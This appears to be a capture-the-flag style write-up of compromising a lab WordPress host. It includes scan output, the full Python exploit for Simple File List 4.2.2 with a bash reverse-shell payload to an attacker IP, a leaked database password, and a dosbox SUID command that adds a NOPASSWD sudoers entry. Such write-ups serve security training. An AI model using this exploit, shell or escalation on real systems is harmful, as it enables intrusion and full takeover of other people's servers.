```
nmap -sC -sV -p- 192.168.207.105
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 10:33 CDT
Nmap scan report for 192.168.207.105
Host is up (0.043s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e6af5d330087aec3828a0884d75da19 (RSA)
|   256 433bb5bf938668e9d5759c7d26945581 (ECDSA)
|_  256 e3f71caecd91c128a33a5bf63eda3f58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-generator: WordPress 5.5.1
|_http-title: Retro Gamming &#8211; Just another WordPress site
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SIPOptions, SSLSessionReq, TerminalServer, TerminalServerCookie, oracle-tns: 
|_    Host '192.168.45.216' is not allowed to connect to this MariaDB server
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
|_http-title: 404 Not Found
13000/tcp open  http        nginx 1.18.0
|_http-title: Login V14
|_http-server-header: nginx/1.18.0
36445/tcp open  netbios-ssn Samba smbd 4.6.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=7/17%Time=64B55FA1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptio
SF:ns,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPReque
SF:st,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBi
SF:ndReqTCP,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNS
SF:StatusRequestTCP,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(Help,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SS
SF:LSessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
SF:TerminalServerCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\
SF:x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20se
SF:rver")%r(Kerberos,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(FourOhFourRequest,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.21
SF:6'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x2
SF:0server")%r(SIPOptions,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.216
SF:'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20
SF:server")%r(TerminalServer,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.
SF:216'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\
SF:x20server")%r(oracle-tns,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.2
SF:16'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x
SF:20server");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.13 seconds
```

Started investigating the wordpress site.

```
wpscan --url http://192.168.207.105
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.

N
[+] URL: http://192.168.207.105/ [192.168.207.105]
[+] Started: Mon Jul 17 10:34:24 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.46 (Unix) PHP/7.4.10
 |  - X-Powered-By: PHP/7.4.10
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.207.105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.207.105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.207.105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.207.105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.207.105/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://192.168.207.105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: news-vibrant
 | Location: http://192.168.207.105/wp-content/themes/news-vibrant/
 | Last Updated: 2022-12-29T00:00:00.000Z
 | Readme: http://192.168.207.105/wp-content/themes/news-vibrant/readme.txt
 | [!] The version is out of date, the latest version is 1.0.14
 | Style URL: http://192.168.207.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1
 | Style Name: News Vibrant
 | Style URI: https://codevibrant.com/wpthemes/news-vibrant
 | Description: News Vibrant is a modern magazine theme with creative design and powerful features that lets you wri...
 | Author: CodeVibrant
 | Author URI: https://codevibrant.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.12 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.207.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1, Match: 'Version:            1.0.12'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.207.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-04-06T18:35:00.000Z
 | [!] The version is out of date, the latest version is 6.1.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.207.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.207.105/wp-content/plugins/simple-file-list/readme.txt

[+] tutor
 | Location: http://192.168.207.105/wp-content/plugins/tutor/
 | Last Updated: 2023-03-30T10:08:00.000Z
 | [!] The version is out of date, the latest version is 2.1.9
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.207.105/wp-content/plugins/tutor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.207.105/wp-content/plugins/tutor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:38 <=====================================> (137 / 137) 100.00% Time: 00:00:38

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jul 17 10:36:05 2023
[+] Requests Done: 175
[+] Cached Requests: 5
[+] Data Sent: 44.542 KB
[+] Data Received: 289.271 KB
[+] Memory used: 250.895 MB
[+] Elapsed time: 00:01:40
```

Found this exploit:
https://www.exploit-db.com/exploits/48979

```
#!/usr/bin/python
# -*- coding: utf-8 -*-
# Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Arbitrary File Upload
# Date: 2020-11-01
# Exploit Author: H4rk3nz0 based off exploit by coiffeur
# Original Exploit: https://www.exploit-db.com/exploits/48349
# Vendor Homepage: https://simplefilelist.com/
# Software Link: https://wordpress.org/plugins/simple-file-list/
# Version: Wordpress v5.4 Simple File List v4.2.2

import requests
import random
import hashlib
import sys
import os
import urllib3
urllib3.disable_warnings()

dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'

def usage():
    banner = """
NAME: Wordpress v5.4 Simple File List v4.2.2, pre-auth RCE
SYNOPSIS: python wp_simple_file_list_4.2.2.py <URL>
AUTHOR: coiffeur
    """
    print(banner)

def generate():
    filename = f'{random.randint(0, 10000)}.png'
    password = hashlib.md5(bytearray(random.getrandbits(8)
                                     for _ in range(20))).hexdigest()
    with open(f'{filename}', 'wb') as f:
        payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.216/3306 0>&1"); ?>'
        f.write(payload.encode())
    print(f'[ ] File {filename} generated with password: {password}')
    return filename, password

def upload(url, filename):
    files = {'file': (filename, open(filename, 'rb'), 'image/png')}
    datas = {'eeSFL_ID': 1, 'eeSFL_FileUploadDir': dir_path,
             'eeSFL_Timestamp': 1587258885, 'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'}
    r = requests.post(url=f'{url}{upload_path}',
                      data=datas, files=files, verify=False)
    r = requests.get(url=f'{url}{dir_path}{filename}', verify=False)
    if r.status_code == 200:
        print(f'[ ] File uploaded at {url}{dir_path}{filename}')
        os.remove(filename)
    else:
        print(f'[*] Failed to upload {filename}')
        exit(-1)
    return filename

def move(url, filename):
    new_filename = f'{filename.split(".")[0]}.php'
    headers = {'Referer': f'{url}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
               'X-Requested-With': 'XMLHttpRequest'}
    datas = {'eeSFL_ID': 1, 'eeFileOld': filename,
             'eeListFolder': '/', 'eeFileAction': f'Rename|{new_filename}'}
    r = requests.post(url=f'{url}{move_path}',
                      data=datas, headers=headers, verify=False)
    if r.status_code == 200:
        print(f'[ ] File moved to {url}{dir_path}{new_filename}')
    else:
        print(f'[*] Failed to move {filename}')
        exit(-1)
    return new_filename

def main(url):
    file_to_upload, password = generate()
    uploaded_file = upload(url, file_to_upload)
    moved_file = move(url, uploaded_file)
    if moved_file:
        print(f'[+] Exploit seem to work.\n[*] Confirmning ...')
    datas = {'password': password, 'cmd': 'phpinfo();'}
    r = requests.post(url=f'{url}{dir_path}{moved_file}',
                      data=datas, verify=False)
    if r.status_code == 200 and r.text.find('php') != -1:
        print('[+] Exploit work !')
        print(f'\tURL: {url}{dir_path}{moved_file}')
        print(f'\tPassword: {password}')

if __name__ == "__main__":
    if (len(sys.argv) < 2):
        usage()
        exit(-1)
    main(sys.argv[1])

```

Changed the port to any that were open on the exterior and found 3306 works. I was able to get a shell as www-data.

I downloaded and ran linpeas and found credentials:

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                    
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );

```

I was then able to login as commander. I also found that the suid bit was set for dosbox.

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
strings Not Found                                                                                                   
strace Not Found                                                                                                    
-rwsr-x--- 1 root dbus 58K Jul  2  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                 
-rws--x--x 1 root root 463K Aug 30  2020 /usr/lib/ssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Sep  2  2020 /usr/lib/Xorg.wrap
-rwsr-xr-x 1 root root 18K Aug  3  2020 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 34K May 16  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 66K Sep 10  2020 /usr/bin/su
-rwsr-xr-x 1 root root 54K May 23  2020 /usr/bin/ksu
-rwsr-xr-x 1 root root 79K Sep  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 26K Aug  3  2020 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                                
-rwsr-xr-x 1 root root 30K Sep 10  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 159K Sep 24  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 27K Sep  7  2020 /usr/bin/expiry
-rwsr-xr-x 1 root root 50K Sep 10  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                             
-rwsr-xr-x 1 root root 63K Sep  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-xr-x 1 root root 34K Sep 10  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 34K Sep 10  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Sep  7  2020 /usr/bin/chage
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
-rwsr-xr-x 1 root root 18K Sep 10  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 root root 43K Jan  4  2020 /usr/bin/mount.cifs
-rwsr-xr-x 1 root root 18K Aug 21  2020 /usr/bin/suexec
-rwsr-sr-t 1 root root 14K Aug 20  2020 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 44K Sep  7  2020 /usr/bin/sg (Unknown SUID binary!)
-rwsr-sr-x 1 root root 38K Aug 12  2020 /usr/bin/unix_chkpwd

```

Dosbox SUID from GTFObins:
https://gtfobins.github.io/gtfobins/dosbox/#suid

I then ran the following commands to give commander sudo permissions

```
LFILE='\etc\sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD:ALL >C:$LFILE" -c exit
```

I was then able to get proof.